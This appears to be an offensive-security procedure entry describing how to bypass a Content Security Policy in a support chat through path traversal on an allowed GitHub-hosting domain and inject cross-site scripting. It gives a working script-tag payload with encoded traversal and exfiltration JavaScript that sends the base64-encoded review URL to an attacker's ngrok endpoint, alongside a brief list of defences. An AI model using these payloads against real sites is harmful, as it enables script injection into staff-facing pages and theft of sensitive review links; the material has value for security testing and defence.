---
tags:
  - xss
  - csp-bypass
  - github-hosting
type: procedure
tools:
  - '[[tools/github-js-hosting]]'
  - '[[tools/ngrok]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-xss-payload-support-chat]]'
  - '[[commands/exfiltrate-url-to-ngrok]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T04:39:10.021Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: e404aecf-295b-425a-89bd-85dd8ade1ff7
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# CSP-Bypass-and-XSS-in-Support-Chat

## Summary

This procedure bypasses Content Security Policy (CSP) in a support chat feature by exploiting URL path backtracking in allowed GitHub domains to load and execute external malicious JavaScript, enabling XSS to exfiltrate sensitive URLs like support review links.

## Description

The application's CSP allows script-src from 'self' and https://raw.githack.com/mattboldt/typed.js/master/lib/, but path backtracking (e.g., using ../) allows loading JS from arbitrary GitHub repos. After rating a chat poorly to trigger review, inject an XSS payload in the chat message. The payload loads hosted JS that exfiltrates the current review URL to an attacker-controlled ngrok endpoint. This requires hosting the malicious JS on GitHub beforehand.

## Requirements

1. Access to support chat feature
2. GitHub repo for hosting final.js with exfiltration code
3. Ngrok tunnel for receiving exfiltrated data
4. Low rating on chat to trigger review page

## Defense

Defensive measures and detection strategies:

- Tighten CSP to disallow path traversal or use nonce/hash-based script loading
- Sanitize all chat inputs to prevent script tags
- Monitor for unusual external script loads from allowed domains
- Rate-limit and validate chat messages

## Objectives

1. Bypass CSP to load external JS
2. Execute XSS in chat context
3. Exfiltrate review URLs for further exploitation

## Instructions

### Step 1: Host Malicious JS on GitHub

**Context**: Upload final.js containing exfiltration code to a GitHub repo (e.g., Ajay-Aj-00/Test/master/final.js).

No command; use GitHub UI or git push.

> JS content: window.location ="https://8a7b2695.ngrok.io/record-data?name=path&data="+btoa(window.location.href)

### Step 2: Initiate Support Chat and Rate Low

**Context**: Start a chat, send a message, and rate it 1 to trigger the review page.

Interact via browser.

> Review page loads, providing context for XSS.

### Step 3: Inject XSS Payload

**Context**: Inject the backtracked script src in the chat message using [[commands/inject-xss-payload-support-chat]]:

```javascript
<script type="text/javascript" src="https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/../..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js"></script>
```

> Payload executes on review, loading external JS.

### Step 4: Exfiltrate URL

**Context**: The loaded JS runs [[commands/exfiltrate-url-to-ngrok]] to send the URL.

```javascript
window.location ="https://8a7b2695.ngrok.io/record-data?name=path&data="+btoa(window.location.href)
```

> Ngrok receives base64-encoded review URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript for Automation

### Sub-Techniques


## Commands Used

- [[commands/inject-xss-payload-support-chat]]
- [[commands/exfiltrate-url-to-ngrok]]

## Tools Used

- [[tools/github-js-hosting]]
- [[tools/ngrok]]

## Tags

- xss
- csp-bypass
- exfiltration
